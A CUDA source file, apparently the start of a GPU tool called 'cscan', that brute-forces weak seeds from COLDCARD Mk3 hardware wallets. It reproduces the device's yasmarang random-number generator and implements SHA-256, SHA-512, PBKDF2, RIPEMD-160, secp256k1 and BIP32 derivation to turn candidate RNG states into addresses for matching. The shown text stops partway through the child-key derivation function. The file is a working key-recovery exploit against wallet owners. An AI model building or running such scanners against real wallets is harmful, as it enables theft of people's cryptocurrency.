// cscan - COLDCARD Mk3 weak-seed CUDA scanner.
// Port of the validated Metal kernel (gpu/metal). One thread = one
// (pad, skip) candidate: yasmarang raw -> SHA256 -> BIP39 sentence ->
// PBKDF2-HMAC-SHA512 -> BIP32 m/84'/0'/0'/0/idx -> hash160 -> match.
// Build: nvcc -O3 -arch=sm_89 scan.cu -o cscan   (sm_80 for 3090)
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <unistd.h>
#include <time.h>
#include <string>
#include <vector>
#include <array>
#include <algorithm>

typedef uint8_t  uchar;
typedef uint32_t uint;
typedef uint64_t ulong;

#define CUDA_CHECK(x) do { cudaError_t e = (x); if (e != cudaSuccess) { \
    fprintf(stderr, "CUDA error %s at %s:%d\n", cudaGetErrorString(e), __FILE__, __LINE__); exit(1);} } while (0)

// ---------------- yasmarang ----------------

struct Yas { uint pad, n, d, dat; };

__device__ inline uint yasNext(Yas &y) {
    y.pad = y.pad + y.dat + y.d * y.n;
    y.pad = (y.pad << 3) | (y.pad >> 29);
    y.n = y.pad | 2u;
    y.d = y.d ^ ((y.pad << 31) + (y.pad >> 1));
    y.dat = (y.dat ^ (y.pad & 0xFFu) ^ (y.d >> 8) ^ 1u) & 0xFFu;
    return y.pad ^ (y.d << 5) ^ (y.pad >> 18) ^ (y.dat << 1);
}

// raw[0..7] = chip^mixer words. chip = {pad, rtcTR, rtcSSR, 0}; skip = prior
// chip draws; mixer fresh. false if on-device fatal (chip==last).
__device__ inline bool rngRawHP(uint pad32, uint rtcTR, uint rtcSSR,
                                int skip, uint raw[8]) {
    Yas c = {pad32, rtcTR, rtcSSR, 0u};
    for (int i = 0; i < skip; i++) yasNext(c);
    Yas m = {0x0A8CE26Fu, 69u, 233u, 0u};
    uint last = 0;
    for (int i = 0; i < 8; i++) {
        uint cv = yasNext(c);
        if (i > 0 && cv == last) return false;
        last = cv;
        raw[i] = cv ^ yasNext(m);
    }
    return true;
}

// ---------------- SHA-512 (16-word ring, cached HMAC pads) ----------------

__constant__ ulong K512[80] = {
    0x428a2f98d728ae22UL,0x7137449123ef65cdUL,0xb5c0fbcfec4d3b2fUL,0xe9b5dba58189dbbcUL,
    0x3956c25bf348b538UL,0x59f111f1b605d019UL,0x923f82a4af194f9bUL,0xab1c5ed5da6d8118UL,
    0xd807aa98a3030242UL,0x12835b0145706fbeUL,0x243185be4ee4b28cUL,0x550c7dc3d5ffb4e2UL,
    0x72be5d74f27b896fUL,0x80deb1fe3b1696b1UL,0x9bdc06a725c71235UL,0xc19bf174cf692694UL,
    0xe49b69c19ef14ad2UL,0xefbe4786384f25e3UL,0x0fc19dc68b8cd5b5UL,0x240ca1cc77ac9c65UL,
    0x2de92c6f592b0275UL,0x4a7484aa6ea6e483UL,0x5cb0a9dcbd41fbd4UL,0x76f988da831153b5UL,
    0x983e5152ee66dfabUL,0xa831c66d2db43210UL,0xb00327c898fb213fUL,0xbf597fc7beef0ee4UL,
    0xc6e00bf33da88fc2UL,0xd5a79147930aa725UL,0x06ca6351e003826fUL,0x142929670a0e6e70UL,
    0x27b70a8546d22ffcUL,0x2e1b21385c26c926UL,0x4d2c6dfc5ac42aedUL,0x53380d139d95b3dfUL,
    0x650a73548baf63deUL,0x766a0abb3c77b2a8UL,0x81c2c92e47edaee6UL,0x92722c851482353bUL,
    0xa2bfe8a14cf10364UL,0xa81a664bbc423001UL,0xc24b8b70d0f89791UL,0xc76c51a30654be30UL,
    0xd192e819d6ef5218UL,0xd69906245565a910UL,0xf40e35855771202aUL,0x106aa07032bbd1b8UL,
    0x19a4c116b8d2d0c8UL,0x1e376c085141ab53UL,0x2748774cdf8eeb99UL,0x34b0bcb5e19b48a8UL,
    0x391c0cb3c5c95a63UL,0x4ed8aa4ae3418acbUL,0x5b9cca4f7763e373UL,0x682e6ff3d6b2b8a3UL,
    0x748f82ee5defb2fcUL,0x78a5636f43172f60UL,0x84c87814a1f0ab72UL,0x8cc702081a6439ecUL,
    0x90befffa23631e28UL,0xa4506cebde82bde9UL,0xbef9a3f7b2c67915UL,0xc67178f2e372532bUL,
    0xca273eceea26619cUL,0xd186b8c721c0c207UL,0xeada7dd6cde0eb1eUL,0xf57d4f7fee6ed178UL,
    0x06f067aa72176fbaUL,0x0a637dc5a2c898a6UL,0x113f9804bef90daeUL,0x1b710b35131c471bUL,
    0x28db77f523047d84UL,0x32caab7b40c72493UL,0x3c9ebe0a15c9bebcUL,0x431d67c49c100d4cUL,
    0x4cc5d4becb3e42b6UL,0x597f299cfc657e2aUL,0x5fcb6fab3ad6faecUL,0x6c44198c4a475817UL
};

struct Sha512 { ulong h[8]; uchar buf[128]; uint buflen; ulong total; };

__device__ inline ulong ror64(ulong x, uint n) { return (x >> n) | (x << (64 - n)); }

__device__ inline void sha512Block(Sha512 &s, const uchar *p) {
    ulong w[16];
    for (int i = 0; i < 16; i++) {
        w[i] = (ulong(p[i*8]) << 56) | (ulong(p[i*8+1]) << 48) | (ulong(p[i*8+2]) << 40) |
               (ulong(p[i*8+3]) << 32) | (ulong(p[i*8+4]) << 24) | (ulong(p[i*8+5]) << 16) |
               (ulong(p[i*8+6]) << 8) | ulong(p[i*8+7]);
    }
    ulong a=s.h[0],b=s.h[1],c=s.h[2],d=s.h[3],e=s.h[4],f=s.h[5],g=s.h[6],hh=s.h[7];
    for (int i = 0; i < 80; i++) {
        if (i >= 16) {
            ulong x = w[(i-15)&15], y = w[(i-2)&15];
            ulong s0 = ror64(x,1) ^ ror64(x,8) ^ (x >> 7);
            ulong s1 = ror64(y,19) ^ ror64(y,61) ^ (y >> 6);
            w[i&15] = w[i&15] + s0 + w[(i-7)&15] + s1;
        }
        ulong S1 = ror64(e,14) ^ ror64(e,18) ^ ror64(e,41);
        ulong ch = (e & f) ^ (~e & g);
        ulong t1 = hh + S1 + ch + K512[i] + w[i&15];
        ulong S0 = ror64(a,28) ^ ror64(a,34) ^ ror64(a,39);
        ulong mj = (a & b) ^ (a & c) ^ (b & c);
        ulong t2 = S0 + mj;
        hh=g; g=f; f=e; e=d+t1; d=c; c=b; b=a; a=t1+t2;
    }
    s.h[0]+=a; s.h[1]+=b; s.h[2]+=c; s.h[3]+=d; s.h[4]+=e; s.h[5]+=f; s.h[6]+=g; s.h[7]+=hh;
}

__device__ inline void sha512Init(Sha512 &s) {
    s.h[0]=0x6a09e667f3bcc908UL; s.h[1]=0xbb67ae8584caa73bUL;
    s.h[2]=0x3c6ef372fe94f82bUL; s.h[3]=0xa54ff53a5f1d36f1UL;
    s.h[4]=0x510e527fade682d1UL; s.h[5]=0x9b05688c2b3e6c1fUL;
    s.h[6]=0x1f83d9abfb41bd6bUL; s.h[7]=0x5be0cd19137e2179UL;
    s.buflen = 0; s.total = 0;
}

__device__ inline void sha512Update(Sha512 &s, const uchar *data, uint len) {
    s.total += len;
    while (len > 0) {
        uint room = 128 - s.buflen;
        uint take = room < len ? room : len;
        for (uint i = 0; i < take; i++) s.buf[s.buflen + i] = data[i];
        s.buflen += take; data += take; len -= take;
        if (s.buflen == 128) { sha512Block(s, s.buf); s.buflen = 0; }
    }
}

__device__ inline void sha512Final(Sha512 &s, uchar out[64]) {
    ulong bits = s.total << 3;
    s.buf[s.buflen++] = 0x80;
    if (s.buflen > 112) {
        while (s.buflen < 128) s.buf[s.buflen++] = 0;
        sha512Block(s, s.buf);
        s.buflen = 0;
    }
    while (s.buflen < 112) s.buf[s.buflen++] = 0;
    for (int i = 0; i < 8; i++) s.buf[112 + i] = 0;
    for (int i = 0; i < 8; i++) s.buf[120 + i] = uchar(bits >> (56 - 8*i));
    sha512Block(s, s.buf);
    for (int i = 0; i < 8; i++) {
        out[i*8]   = uchar(s.h[i] >> 56); out[i*8+1] = uchar(s.h[i] >> 48);
        out[i*8+2] = uchar(s.h[i] >> 40); out[i*8+3] = uchar(s.h[i] >> 32);
        out[i*8+4] = uchar(s.h[i] >> 24); out[i*8+5] = uchar(s.h[i] >> 16);
        out[i*8+6] = uchar(s.h[i] >> 8);  out[i*8+7] = uchar(s.h[i]);
    }
}

__device__ inline void sha512once(const uchar *data, uint len, uchar out[64]) {
    Sha512 s; sha512Init(s); sha512Update(s, data, len); sha512Final(s, out);
}

// PBKDF2-HMAC-SHA512, dkLen 64, salt "mnemonic", cached pads.
__device__ inline void pbkdf2Bip39(const uchar *pw, uint pwlen, uchar out[64]) {
    uchar kblock[128];
    for (int i = 0; i < 128; i++) kblock[i] = 0;
    if (pwlen > 128) {
        uchar kh[64]; sha512once(pw, pwlen, kh);
        for (int i = 0; i < 64; i++) kblock[i] = kh[i];
    } else {
        for (uint i = 0; i < pwlen; i++) kblock[i] = pw[i];
    }
    uchar pad[128];
    Sha512 ictx, octx, s;
    for (int i = 0; i < 128; i++) pad[i] = kblock[i] ^ 0x36;
    sha512Init(ictx); sha512Update(ictx, pad, 128);
    for (int i = 0; i < 128; i++) pad[i] = kblock[i] ^ 0x5c;
    sha512Init(octx); sha512Update(octx, pad, 128);
    uchar saltblk[12] = {'m','n','e','m','o','n','i','c',0,0,0,1};
    uchar u[64];
    s = ictx; sha512Update(s, saltblk, 12); sha512Final(s, u);
    s = octx; sha512Update(s, u, 64); sha512Final(s, u);
    uchar t[64];
    for (int i = 0; i < 64; i++) t[i] = u[i];
    for (int it = 1; it < 2048; it++) {
        s = ictx; sha512Update(s, u, 64); sha512Final(s, u);
        s = octx; sha512Update(s, u, 64); sha512Final(s, u);
        for (int i = 0; i < 64; i++) t[i] ^= u[i];
    }
    for (int i = 0; i < 64; i++) out[i] = t[i];
}

// ---------------- SHA-256 + RIPEMD-160 ----------------

__constant__ uint K256[64] = {
    0x428a2f98u,0x71374491u,0xb5c0fbcfu,0xe9b5dba5u,0x3956c25bu,0x59f111f1u,0x923f82a4u,0xab1c5ed5u,
    0xd807aa98u,0x12835b01u,0x243185beu,0x550c7dc3u,0x72be5d74u,0x80deb1feu,0x9bdc06a7u,0xc19bf174u,
    0xe49b69c1u,0xefbe4786u,0x0fc19dc6u,0x240ca1ccu,0x2de92c6fu,0x4a7484aau,0x5cb0a9dcu,0x76f988dau,
    0x983e5152u,0xa831c66du,0xb00327c8u,0xbf597fc7u,0xc6e00bf3u,0xd5a79147u,0x06ca6351u,0x14292967u,
    0x27b70a85u,0x2e1b2138u,0x4d2c6dfcu,0x53380d13u,0x650a7354u,0x766a0abbu,0x81c2c92eu,0x92722c85u,
    0xa2bfe8a1u,0xa81a664bu,0xc24b8b70u,0xc76c51a3u,0xd192e819u,0xd6990624u,0xf40e3585u,0x106aa070u,
    0x19a4c116u,0x1e376c08u,0x2748774cu,0x34b0bcb5u,0x391c0cb3u,0x4ed8aa4au,0x5b9cca4fu,0x682e6ff3u,
    0x748f82eeu,0x78a5636fu,0x84c87814u,0x8cc70208u,0x90befffau,0xa4506cebu,0xbef9a3f7u,0xc67178f2u
};

__device__ inline uint ror32(uint x, uint n) { return (x >> n) | (x << (32 - n)); }

__device__ inline void sha256once(const uchar *data, uint len, uchar out[32]) {
    uint h[8] = {0x6a09e667u,0xbb67ae85u,0x3c6ef372u,0xa54ff53au,0x510e527fu,0x9b05688cu,0x1f83d9abu,0x5be0cd19u};
    uchar block[128];
    for (int i = 0; i < 128; i++) block[i] = 0;
    for (uint i = 0; i < len; i++) block[i] = data[i];
    block[len] = 0x80;
    uint nblocks = (len >= 56) ? 2 : 1;
    ulong bits = ulong(len) << 3;
    for (int i = 0; i < 8; i++) block[nblocks*64 - 8 + i] = uchar(bits >> (56 - 8*i));
    for (uint b = 0; b < nblocks; b++) {
        const uchar *p = block + b*64;
        uint w[64];
        for (int i = 0; i < 16; i++)
            w[i] = (uint(p[i*4])<<24)|(uint(p[i*4+1])<<16)|(uint(p[i*4+2])<<8)|uint(p[i*4+3]);
        for (int i = 16; i < 64; i++) {
            uint s0 = ror32(w[i-15],7)^ror32(w[i-15],18)^(w[i-15]>>3);
            uint s1 = ror32(w[i-2],17)^ror32(w[i-2],19)^(w[i-2]>>10);
            w[i] = w[i-16]+s0+w[i-7]+s1;
        }
        uint a=h[0],bb=h[1],c=h[2],d=h[3],e=h[4],f=h[5],g=h[6],hh=h[7];
        for (int i = 0; i < 64; i++) {
            uint S1 = ror32(e,6)^ror32(e,11)^ror32(e,25);
            uint ch = (e&f)^(~e&g);
            uint t1 = hh+S1+ch+K256[i]+w[i];
            uint S0 = ror32(a,2)^ror32(a,13)^ror32(a,22);
            uint mj = (a&bb)^(a&c)^(bb&c);
            uint t2 = S0+mj;
            hh=g;g=f;f=e;e=d+t1;d=c;c=bb;bb=a;a=t1+t2;
        }
        h[0]+=a;h[1]+=bb;h[2]+=c;h[3]+=d;h[4]+=e;h[5]+=f;h[6]+=g;h[7]+=hh;
    }
    for (int i = 0; i < 8; i++) {
        out[i*4]=uchar(h[i]>>24); out[i*4+1]=uchar(h[i]>>16);
        out[i*4+2]=uchar(h[i]>>8); out[i*4+3]=uchar(h[i]);
    }
}

// RIPEMD-160, single-block path (input always 32 bytes). IV order fixed.
__constant__ uint RL[80] = {
    0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,
    7,4,13,1,10,6,15,3,12,0,9,5,2,14,11,8,
    3,10,14,4,9,15,8,1,2,7,0,6,13,11,5,12,
    1,9,11,10,0,8,12,4,13,3,7,15,14,5,6,2,
    4,0,5,9,7,12,2,10,14,1,3,8,11,6,15,13
};
__constant__ uint RR[80] = {
    5,14,7,0,9,2,11,4,13,6,15,8,1,10,3,12,
    6,11,3,7,0,13,5,10,14,15,8,12,4,9,1,2,
    15,5,1,3,7,14,6,9,11,8,12,2,10,0,4,13,
    8,6,4,1,3,11,15,0,5,12,2,13,9,7,10,14,
    12,15,10,4,1,5,8,7,6,2,13,14,0,3,9,11
};
__constant__ uint SL[80] = {
    11,14,15,12,5,8,7,9,11,13,14,15,6,7,9,8,
    7,6,8,13,11,9,7,15,7,12,15,9,11,7,13,12,
    11,13,6,7,14,9,13,15,14,8,13,6,5,12,7,5,
    11,12,14,15,14,15,9,8,9,14,5,6,8,6,5,12,
    9,15,5,11,6,8,13,12,5,12,13,14,11,8,5,6
};
__constant__ uint SR[80] = {
    8,9,9,11,13,15,15,5,7,7,8,11,14,14,12,6,
    9,13,15,7,12,8,9,11,7,7,12,7,6,15,13,11,
    9,7,15,11,8,6,6,14,12,13,5,14,13,13,7,5,
    15,5,8,11,14,14,6,14,6,9,12,9,12,5,15,8,
    8,5,12,9,12,5,14,6,8,13,6,5,15,13,11,11
};

__device__ inline uint ripemdF(int j, uint x, uint y, uint z) {
    if (j < 16) return x ^ y ^ z;
    if (j < 32) return (x & y) | (~x & z);
    if (j < 48) return (x | ~y) ^ z;
    if (j < 64) return (x & z) | (y & ~z);
    return x ^ (y | ~z);
}

__device__ inline void ripemd160_32(const uchar in[32], uchar out[20]) {
    uint x[16];
    for (int i = 0; i < 8; i++)
        x[i] = uint(in[i*4]) | (uint(in[i*4+1])<<8) | (uint(in[i*4+2])<<16) | (uint(in[i*4+3])<<24);
    x[8] = 0x80u;
    for (int i = 9; i < 14; i++) x[i] = 0;
    x[14] = 256u; x[15] = 0;
    uint al=0x67452301u,bl=0xefcdab89u,cl=0x98badcfeu,dl=0x10325476u,el=0xc3d2e1f0u;
    uint ar=al,br=bl,cr=cl,dr=dl,er=el;
    const uint KL[5] = {0x00000000u,0x5a827999u,0x6ed9eba1u,0x8f1bbcdcu,0xa953fd4eu};
    const uint KR[5] = {0x50a28be6u,0x5c4dd124u,0x6d703ef3u,0x7a6d76e9u,0x00000000u};
    for (int j = 0; j < 80; j++) {
        uint tl = al + ripemdF(j,bl,cl,dl) + x[RL[j]] + KL[j/16];
        tl = (tl << SL[j]) | (tl >> (32 - SL[j]));
        tl += el; al=el; el=dl; dl=(cl<<10)|(cl>>22); cl=bl; bl=tl;
        uint tr = ar + ripemdF(79-j,br,cr,dr) + x[RR[j]] + KR[j/16];
        tr = (tr << SR[j]) | (tr >> (32 - SR[j]));
        tr += er; ar=er; er=dr; dr=(cr<<10)|(cr>>22); cr=br; br=tr;
    }
    uint hs[5];
    hs[0] = 0xefcdab89u + cl + dr;
    hs[1] = 0x98badcfeu + dl + er;
    hs[2] = 0x10325476u + el + ar;
    hs[3] = 0xc3d2e1f0u + al + br;
    hs[4] = 0x67452301u + bl + cr;
    for (int i = 0; i < 5; i++) {
        out[i*4]=uchar(hs[i]); out[i*4+1]=uchar(hs[i]>>8);
        out[i*4+2]=uchar(hs[i]>>16); out[i*4+3]=uchar(hs[i]>>24);
    }
}

__device__ __noinline__ void hash160(const uchar *data, uint len, uchar out[20]) {
    uchar sh[32];
    sha256once(data, len, sh);
    ripemd160_32(sh, out);
}

// ---------------- secp256k1: 8x32 limbs, Jacobian, G-table mul ----------------

struct Fe { uint l[8]; };
struct Pt { Fe x, y, z; };

__constant__ uint SECP_P[8]  = {0xFFFFFC2Fu,0xFFFFFFFEu,0xFFFFFFFFu,0xFFFFFFFFu,
                                0xFFFFFFFFu,0xFFFFFFFFu,0xFFFFFFFFu,0xFFFFFFFFu};
__constant__ uint SECP_GX[8] = {0x16F81798u,0x59F2815Bu,0x2DCE28D9u,0x029BFCDBu,
                                0xCE870B07u,0x55A06295u,0xF9DCBBACu,0x79BE667Eu};
__constant__ uint SECP_GY[8] = {0xFB10D4B8u,0x9C47D08Fu,0xA6855419u,0xFD17B448u,
                                0x0E1108A8u,0x5DA4FBFCu,0x26A3C465u,0x483ADA77u};

__device__ inline bool feIsZero(const Fe &a) {
    uint v = 0; for (int i = 0; i < 8; i++) v |= a.l[i];
    return v == 0;
}

__device__ inline void feNormalize(Fe &a) {
    for (int rep = 0; rep < 3; rep++) {
        bool ge = true;
        for (int i = 7; i >= 0; i--) {
            if (a.l[i] > SECP_P[i]) break;
            if (a.l[i] < SECP_P[i]) { ge = false; break; }
        }
        if (!ge) break;
        ulong borrow = 0;
        for (int i = 0; i < 8; i++) {
            ulong d = ulong(a.l[i]) - SECP_P[i] - borrow;
            a.l[i] = uint(d & 0xFFFFFFFFu);
            borrow = (d >> 63) & 1;
        }
    }
}

__device__ inline void feAdd(Fe &r, const Fe &a, const Fe &b) {
    ulong acc = 0;
    for (int i = 0; i < 8; i++) {
        acc += ulong(a.l[i]) + b.l[i];
        r.l[i] = uint(acc & 0xFFFFFFFFu);
        acc >>= 32;
    }
    if (acc) {
        ulong t = ulong(r.l[0]) + 0x1000003D1u;
        r.l[0] = uint(t & 0xFFFFFFFFu);
        ulong carry = t >> 32;
        for (int i = 1; i < 8 && carry; i++) {
            t = ulong(r.l[i]) + carry;
            r.l[i] = uint(t & 0xFFFFFFFFu);
            carry = t >> 32;
        }
    }
    feNormalize(r);
}

__device__ inline void feSub(Fe &r, const Fe &a, const Fe &b) {
    ulong borrow = 0;
    for (int i = 0; i < 8; i++) {
        ulong d = ulong(a.l[i]) - b.l[i] - borrow;
        r.l[i] = uint(d & 0xFFFFFFFFu);
        borrow = (d >> 63) & 1;
    }
    if (borrow) {
        ulong acc = 0;
        for (int i = 0; i < 8; i++) {
            acc += ulong(r.l[i]) + SECP_P[i];
            r.l[i] = uint(acc & 0xFFFFFFFFu);
            acc >>= 32;
        }
    }
    feNormalize(r);
}

__device__ inline void limbAdd(uint r[16], int k, ulong v) {
    while (v && k < 16) {
        ulong t = ulong(r[k]) + (v & 0xFFFFFFFFu);
        r[k] = uint(t & 0xFFFFFFFFu);
        v = (v >> 32) + (t >> 32);
        k++;
    }
}

__device__ inline void feMul(Fe &r, const Fe &a, const Fe &b) {
    uint t[16];
    for (int i = 0; i < 16; i++) t[i] = 0;
    for (int i = 0; i < 8; i++) {
        ulong carry = 0;
        for (int j = 0; j < 8; j++) {
            ulong prod = ulong(a.l[i]) * ulong(b.l[j]) + ulong(t[i+j]) + carry;
            t[i+j] = uint(prod & 0xFFFFFFFFu);
            carry = prod >> 32;
        }
        limbAdd(t, i+8, carry);
    }
    for (int pass = 0; pass < 2; pass++) {
        for (int i = 15; i >= 8; i--) {
            uint c = t[i];
            if (!c) continue;
            t[i] = 0;
            limbAdd(t, i-8, ulong(c) * 977u);
            limbAdd(t, i-7, ulong(c));
        }
    }
    for (int i = 0; i < 8; i++) r.l[i] = t[i];
    feNormalize(r);
}

__device__ inline void feSqr(Fe &r, const Fe &a) { feMul(r, a, a); }

__device__ inline void feMulSmall(Fe &r, const Fe &a, uint m) {
    ulong acc = 0;
    for (int i = 0; i < 8; i++) {
        acc += ulong(a.l[i]) * ulong(m);
        r.l[i] = uint(acc & 0xFFFFFFFFu);
        acc >>= 32;
    }
    while (acc) {
        ulong v = (acc & 0xFFFFFFFFu);
        ulong t = ulong(r.l[0]) + v * 977u;
        r.l[0] = uint(t & 0xFFFFFFFFu);
        ulong carry = t >> 32;
        t = ulong(r.l[1]) + v + carry;
        r.l[1] = uint(t & 0xFFFFFFFFu);
        carry = t >> 32;
        int i = 2;
        while (carry && i < 8) {
            t = ulong(r.l[i]) + carry;
            r.l[i] = uint(t & 0xFFFFFFFFu);
            carry = t >> 32;
            i++;
        }
        acc >>= 32;
    }
    feNormalize(r);
}

__constant__ uint SECP_PM2[8] = {0xFFFFFC2Du,0xFFFFFFFEu,0xFFFFFFFFu,0xFFFFFFFFu,
                                 0xFFFFFFFFu,0xFFFFFFFFu,0xFFFFFFFFu,0xFFFFFFFFu};

__device__ inline void feInv(Fe &r, const Fe &a) {
    Fe result;
    for (int i = 0; i < 8; i++) result.l[i] = 0;
    result.l[0] = 1;
    Fe base = a;
    for (int i = 0; i < 8; i++) {
        for (int b = 0; b < 32; b++) {
            if ((SECP_PM2[i] >> b) & 1u) feMul(result, result, base);
            Fe nb; feSqr(nb, base); base = nb;
        }
    }
    r = result;
}

__device__ inline void feFromBytesBE(Fe &r, const uchar *in) {
    for (int i = 0; i < 8; i++) {
        int o = 28 - i*4;
        r.l[i] = (uint(in[o])<<24)|(uint(in[o+1])<<16)|(uint(in[o+2])<<8)|uint(in[o+3]);
    }
}

__device__ inline void feToBytesBE(Fe &a, uchar *out) {
    feNormalize(a);
    for (int i = 0; i < 8; i++) {
        int o = 28 - i*4;
        out[o]   = uchar(a.l[i] >> 24); out[o+1] = uchar(a.l[i] >> 16);
        out[o+2] = uchar(a.l[i] >> 8);  out[o+3] = uchar(a.l[i]);
    }
}

__device__ inline bool ptIsInf(const Pt &p) { return feIsZero(p.z); }
__device__ inline void ptSetInf(Pt &p) {
    for (int i = 0; i < 8; i++) { p.x.l[i]=0; p.y.l[i]=0; p.z.l[i]=0; }
}

__device__ inline void ptDbl(Pt &p) {
    if (ptIsInf(p)) return;
    Fe a, b, c, d, e, f, t;
    feSqr(a, p.x);
    feSqr(b, p.y);
    feSqr(c, b);
    feAdd(t, p.x, b);
    feSqr(t, t);
    feSub(t, t, a);
    feSub(t, t, c);
    feAdd(d, t, t);
    feMulSmall(e, a, 3);
    feSqr(f, e);
    feAdd(t, d, d);
    Fe nx; feSub(nx, f, t);
    feSub(t, d, nx);
    feMul(t, e, t);
    Fe c8; feMulSmall(c8, c, 8);
    Fe ny; feSub(ny, t, c8);
    Fe nz; feMul(nz, p.y, p.z);
    feAdd(nz, nz, nz);
    p.x = nx; p.y = ny; p.z = nz;
}

__device__ inline void ptAdd(Pt &p, const Pt &q) {
    if (ptIsInf(q)) return;
    if (ptIsInf(p)) { p = q; return; }
    Fe z1z1, z2z2, u1, u2, s1, s2, h, r, t;
    feSqr(z1z1, p.z);
    feSqr(z2z2, q.z);
    feMul(u1, p.x, z2z2);
    feMul(u2, q.x, z1z1);
    feMul(t, q.z, z2z2); feMul(s1, p.y, t);
    feMul(t, p.z, z1z1); feMul(s2, q.y, t);
    feSub(h, u2, u1);
    feSub(r, s2, s1);
    if (feIsZero(h)) {
        if (feIsZero(r)) { ptDbl(p); return; }
        ptSetInf(p); return;
    }
    Fe hh, hhh, v;
    feSqr(hh, h);
    feMul(hhh, h, hh);
    feMul(v, u1, hh);
    Fe nx, ny, nz;
    feSqr(nx, r);
    feSub(nx, nx, hhh);
    feSub(nx, nx, v);
    feSub(nx, nx, v);
    feSub(t, v, nx);
    feMul(t, r, t);
    Fe u1hhh; feMul(u1hhh, s1, hhh);
    feSub(ny, t, u1hhh);
    feMul(nz, p.z, q.z);
    feMul(nz, nz, h);
    p.x = nx; p.y = ny; p.z = nz;
}

__device__ inline Pt gPoint() {
    Pt g;
    for (int i = 0; i < 8; i++) { g.x.l[i]=SECP_GX[i]; g.y.l[i]=SECP_GY[i]; g.z.l[i]=0; }
    g.z.l[0] = 1;
    return g;
}

// mixed add: p (Jacobian) += q (affine)
__device__ inline void ptAddMixed(Pt &p, const Pt &q) {
    if (ptIsInf(q)) return;
    if (ptIsInf(p)) { p = q; p.z.l[0] = 1; return; }
    Fe z1z1, u2, s2, h, r, t;
    feSqr(z1z1, p.z);
    feMul(u2, q.x, z1z1);
    feMul(t, p.z, z1z1);
    feMul(s2, q.y, t);
    feSub(h, u2, p.x);
    feSub(r, s2, p.y);
    if (feIsZero(h)) {
        if (feIsZero(r)) { ptDbl(p); return; }
        ptSetInf(p); return;
    }
    Fe hh, hhh, v;
    feSqr(hh, h);
    feMul(hhh, h, hh);
    feMul(v, p.x, hh);
    Fe nx, ny, nz;
    feSqr(nx, r);
    feSub(nx, nx, hhh);
    feSub(nx, nx, v);
    feSub(nx, nx, v);
    feSub(t, v, nx);
    feMul(t, r, t);
    Fe pyhhh; feMul(pyhhh, p.y, hhh);
    feSub(ny, t, pyhhh);
    feMul(nz, p.z, h);
    p.x = nx; p.y = ny; p.z = nz;
}

// k*G via doublings table: table[j] = 2^j * G (affine, device memory)
__device__ inline void mulGTable(Pt &r, const uchar k[32], const Pt *table) {
    ptSetInf(r);
    for (int byte = 31; byte >= 0; byte--) {
        for (int bit = 0; bit < 8; bit++) {
            if ((k[byte] >> bit) & 1) {
                int j = 8 * (31 - byte) + bit;
                ptAddMixed(r, table[j]);
            }
        }
    }
}

__device__ inline void ptSerialize(Pt &p, uchar out[33]) {
    Fe zinv, z2, ax, ay;
    feInv(zinv, p.z);
    feSqr(z2, zinv);
    feMul(ax, p.x, z2);
    feMul(ay, p.y, z2);
    feMul(ay, ay, zinv);
    feToBytesBE(ax, out + 1);
    feNormalize(ay);
    out[0] = (ay.l[0] & 1u) ? 0x03 : 0x02;
}

// ---------------- BIP32 + kernel ----------------

__constant__ uchar NB[32] = {
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFE,
    0xBA,0xAE,0xDC,0xE6,0xAF,0x48,0xA0,0x3B,
    0xBF,0xD2,0x5E,0x8C,0xD0,0x36,0x41,0x41
};

// k = (k + il) mod n, 32-byte big-endian
__device__ inline void scalarAddModN(uchar k[32], const uchar il[32]) {
    ulong carry = 0;
    for (int i = 31; i >= 0; i--) {
        ulong t = ulong(k[i]) + ulong(il[i]) + carry;
        k[i] = uchar(t & 0xFF);
        carry = t >> 8;
    }
    bool ge = carry != 0;
    if (!ge) {
        ge = true;
        for (int i = 0; i < 32; i++) {
            if (k[i] > NB[i]) break;
            if (k[i] < NB[i]) { ge = false; break; }
        }
    }
    if (ge) {
        ulong borrow = 0;
        for (int i = 31; i >= 0; i--) {
            ulong d = ulong(k[i]) - ulong(NB[i]) - borrow;
            k[i] = uchar(d & 0xFF);
            borrow = (d >> 63) & 1;
        }
    }
}

__device__ inline void hmacSha512(const uchar *key, uint klen,
                                  const uchar *msg, uint mlen, uchar out[64]) {
    uchar kblock[128];
    for (int i = 0; i < 128; i++) kblock[i] = 0;
    if (klen > 128) {
        uchar kh[64]; sha512once(key, klen, kh);
        for (int i = 0; i < 64; i++) kblock[i] = kh[i];
    } else {
        for (uint i = 0; i < klen; i++) kblock[i] = key[i];
    }
    uchar pad[128];
    for (int i = 0; i < 128; i++) pad[i] = kblock[i] ^ 0x36;
    Sha512 s; sha512Init(s); sha512Update(s, pad, 128);
    sha512Update(s, msg, mlen);
    uchar ih[64]; sha512Final(s, ih);
    for (int i = 0; i < 128; i++) pad[i] = kblock[i] ^ 0x5c;
    sha512Init(s); sha512Update(s, pad, 128); sha512Update(s, ih, 64);
    sha512Final(s, out);
}

// entropy(32) -> 24-word sentence; words8 = 2048 slots x 8 bytes zero-padded
__device__ inline void entropyToSentence(const uchar ent[32], const uchar *words8,
                                         uchar *out, uint &outLen) {
    uchar csh[32];
    sha256once(ent, 32, csh);
    outLen = 0;
    for (int w = 0; w < 24; w++) {
        uint idx = 0;
        for (int b = 0; b < 11; b++) {
            uint bp = uint(w) * 11 + uint(b);
            uint bit;
            if (bp < 256) bit = (ent[bp >> 3] >> (7 - (bp & 7))) & 1u;
            else          bit = (csh[0] >> (7 - (bp - 256))) & 1u;
            idx = (idx << 1) | bit;
        }
        if (w) out[outLen++] = ' ';
        const uchar *wp = words8 + idx * 8;
        for (int i = 0; i < 8 && wp[i]; i++) out[outLen++] = wp[i];
    }
}

struct EKey { uchar key[32]; uchar cc[32]; };

__device__ inline EKey masterFromSeed(const uchar seed[64]) {
    uchar I[64];
    uchar ks[12] = {'B','i','t','c','o','i','n',' ','s','e','e','d'};
    hmacSha512(ks, 12, seed, 64, I);
    EKey k;
    for (int i = 0; i < 32; i++) { k.key[i] = I[i]; k.cc[i] = I[32 + i]; }
    return k;
}

__device__ inline EKey ckdPriv(const EKey &par, uint index, const Pt *gtab) {
    uchar data[37];
    uint dlen;
    if (index & 0x80000000u) {
        data[0] = 0;
        for (int i = 0; i < 32; i++) data[1 + i] = par.key[i];
        dlen = 33;
    } else {
        Pt p; mulGTable(p, par.key, gtab);
        ptSerialize(p, data);
        dlen = 33;
    }
